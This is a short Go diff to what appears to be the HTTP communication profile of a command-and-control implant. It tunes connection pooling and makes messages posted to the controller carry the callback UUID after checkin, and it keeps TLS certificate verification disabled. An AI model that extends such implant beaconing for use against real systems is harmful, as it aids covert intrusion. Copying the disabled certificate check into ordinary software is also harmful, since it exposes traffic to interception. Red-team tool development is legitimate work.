@@ -56,6 +56,9 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 			TLSClientConfig: &tls.Config{
 				InsecureSkipVerify: true, // For testing - should be configurable
 			},
+			MaxIdleConns:        10,
+			MaxIdleConnsPerHost: 5,
+			IdleConnTimeout:     90 * time.Second,
 		},
 	}
 
@@ -415,7 +418,9 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 	}
 
 	// Send using Freyja-style format: UUID + JSON, then base64 encode
-	messageData := append([]byte(agent.PayloadUUID), body...)
+	// Must use callback UUID (not payload UUID) after checkin
+	activeUUID := h.getActiveUUID(agent)
+	messageData := append([]byte(activeUUID), body...)
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
 	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
